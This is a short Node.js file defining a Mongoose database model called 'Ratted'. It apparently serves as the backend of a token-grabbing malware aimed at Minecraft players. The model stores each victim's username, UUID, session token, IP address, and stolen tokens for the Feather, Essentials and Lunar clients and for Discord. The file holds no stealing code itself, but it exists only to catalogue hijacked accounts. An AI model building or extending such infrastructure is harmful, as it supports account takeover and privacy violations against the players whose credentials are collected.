const mongoose = require("mongoose")

const rattedSchema = mongoose.Schema({
    username: String,
    uuid: String,
    token: String,
    ip: String,
    timestamp: Date,

    tokenAuth: String,
    feather: String,
    essentials: String,
    lunar: String,
    discord: String
})

module.exports = mongoose.model("Ratted", rattedSchema)